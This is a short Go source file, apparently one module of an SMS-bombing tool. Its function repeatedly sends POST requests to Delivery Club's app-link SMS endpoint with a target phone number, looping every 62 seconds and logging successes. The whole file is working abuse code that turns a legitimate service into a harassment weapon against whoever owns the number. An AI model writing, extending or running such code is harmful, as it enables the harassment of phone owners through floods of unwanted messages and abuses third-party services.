package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func deliclublink() {
	req := newreq()
	req.SetBodyString("mobile-links-tel=%2B" + num)
	req.SetRequestURI("https://www.delivery-club.ru/ajax/sms_mobile_app_link")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `success":1`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
